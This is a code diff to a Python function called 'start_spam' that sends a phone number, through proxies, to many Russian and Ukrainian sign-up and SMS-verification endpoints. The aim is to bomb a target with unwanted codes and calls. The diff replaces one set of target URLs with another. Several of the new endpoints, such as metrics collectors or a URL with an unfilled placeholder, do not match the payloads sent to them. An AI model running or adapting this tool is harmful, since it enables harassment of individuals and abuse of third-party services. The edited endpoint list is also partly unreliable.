@@ -103,7 +103,7 @@ def start_spam(phone, proxies):
         except:
             pass
         try:
-            post("https://youla.ru/web-api/auth/request_code", data={"phone": phone}, headers=headers, proxies=proxies)
+            post( "https://www.tinkoff.ru/api/common/v1/sign_up?origin=web%2Cib5%2Cplatform&sessionid=uRdqKtttiyJYz6ShCqO076kNyTraz7pa.m1-prod-api56&wuid=8604f6d4327bf4ef2fc2b3efb36c8e35", data={"phone": phone}, headers=headers, proxies=proxies)
         except:
             pass
         try:
@@ -111,11 +111,11 @@ def start_spam(phone, proxies):
         except:
             pass
         try:
-            post("https://youla.ru/web-api/auth/request_code", data={"phone": phone}, headers=headers, proxies=proxies)
+            post("https://m.ok.ru/web-api/v2/reports/lifecycle", data={"phone": phone}, headers=headers, proxies=proxies)
         except:
             pass
         try:
-            post("https://cabinet.wi-fi.ru/api/auth/by-sms", data={"msisdn": phone}, headers=headers, proxies=proxies)
+            post("https://www.winelab.ru/confirmation/sendByPhone?number={winelab}", data={"msisdn": phone}, headers=headers, proxies=proxies)
         except:
             pass
         try:
@@ -131,12 +131,12 @@ def start_spam(phone, proxies):
         except:
             pass
         try:
-            post("https://b.utair.ru/api/v1/login/", json={"login": phone, "confirmation_type": "call_code"}, headers=headers, proxies=proxies)
+            post("https://client.taximaxim.ru/ru-RU/site/send-code/", json={"login": phone, "confirmation_type": "call_code"}, headers=headers, proxies=proxies)
         except:
             pass
         try:
             formatted_phone = format_phone(phone, "#(###)###-##-##")
-            post("https://www.r-ulybka.ru/login/form_ajax.php", data={"action": "auth", "phone": formatted_phone}, headers=headers, proxies=proxies)
+            post("https://my.telegram.org/auth/send_password", data={"action": "auth", "phone": formatted_phone}, headers=headers, proxies=proxies)
         except:
             pass
         try:
@@ -144,7 +144,7 @@ def start_spam(phone, proxies):
         except:
             pass
         try:
-            post("https://partner.uklon.com.ua/api/v1/registration/sendcode", headers={"client_id": "6289de851fc726f887af8d5d7a56c635", "User-Agent": generate_user_agent()}, json={"phone": phone}, proxies=proxies)
+            post("https://client.taximaxim.ru/ru-RU/site/send-code/", headers={"client_id": "6289de851fc726f887af8d5d7a56c635", "User-Agent": generate_user_agent()}, json={"phone": phone}, proxies=proxies)
         except:
             pass
         try:
@@ -350,16 +350,16 @@ def start_spam(phone, proxies):
         except:
             pass
         try:
-            post("https://ontaxi.com.ua/api/v2/web/client", json={"country": "UA", "phone": phone[3:]}, headers=headers, proxies=proxies)
+            post("https://clientsapi04w.bk6bba-resources.com/cps/superRegistration/createProcess", json={"country": "UA", "phone": phone[3:]}, headers=headers, proxies=proxies)
         except:
             pass
         try:
-            get("https://secure.online.ua/ajax/check_phone/", params={"reg_phone": phone}, headers=headers, proxies=proxies)
+            get("https://4lapy.ru/ajax/confirmation/phone/send-code", params={"reg_phone": phone}, headers=headers, proxies=proxies)
         except:
             pass
         try:
             formatted_phone = format_phone(phone9, "8 (###) ###-##-##")
-            get("https://okeansushi.ru/includes/contact.php", params={"call_mail": "1", "ajax": "1", "name": name, "phone": formatted_phone, "call_time": "1", "pravila2": "on"}, headers=headers, proxies=proxies)
+            get("https://api.eapteka.ru/api/v3/user", params={"call_mail": "1", "ajax": "1", "name": name, "phone": formatted_phone, "call_time": "1", "pravila2": "on"}, headers=headers, proxies=proxies)
         except:
             pass
         try:
@@ -371,7 +371,7 @@ def start_spam(phone, proxies):
         except:
             pass
         try:
-            post("https://www.nl.ua", data={"component": "bxmaker.authuserphone.login", "sessid": "bf70db951f54b837748f69b75a61deb4", "method": "sendCode", "phone": phone, "registration": "N"}, headers=headers, proxies=proxies)
+            post("https://www.ozon.ru/api/composer-api.bx/widget/json/v2?widgetStateId=loginOrRegistration-340567-default-1", data={"component": "bxmaker.authuserphone.login", "sessid": "bf70db951f54b837748f69b75a61deb4", "method": "sendCode", "phone": phone, "registration": "N"}, headers=headers, proxies=proxies)
         except:
             pass
         try:
@@ -383,7 +383,7 @@ def start_spam(phone, proxies):
         except:
             pass
         try:
-            post("https://auth.multiplex.ua/login", json={"login": phone}, headers=headers, proxies=proxies)
+            post("https://xapi.ozon.ru/perf-metrics-collector/v4/rum/bx/web", json={"login": phone}, headers=headers, proxies=proxies)
         except:
             pass
         try:
